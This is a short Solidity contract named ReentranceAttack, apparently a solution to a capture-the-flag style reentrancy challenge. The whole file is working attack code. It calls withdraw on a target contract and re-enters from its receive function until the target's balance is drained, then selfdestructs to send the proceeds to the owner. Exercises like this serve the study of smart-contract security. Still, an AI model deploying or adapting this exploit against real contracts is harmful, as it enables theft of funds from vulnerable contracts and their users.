// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import 'interfaces/reentranceInterface.sol';

contract ReentranceAttack {
    ReentranceInterface reentrance;
    address payable public owner;
    uint public amount;
    
    constructor(address _address, uint _amount) public {
        owner = msg.sender;
        amount = _amount;
        reentrance = ReentranceInterface(_address);
    }

    function attack() public {
        reentrance.withdraw(amount);
    }

    // As we will receive some Ethers, our receive or fallback function
    // should take care of the reentrancy attack
    receive() external payable {
        // Check th contract's balance and abuse it until its balance 
        // is no longer greater than 0
        if (address(reentrance).balance > 0) {
            attack();
        }
    }

    function destroy() public {
        selfdestruct(owner);
    }
}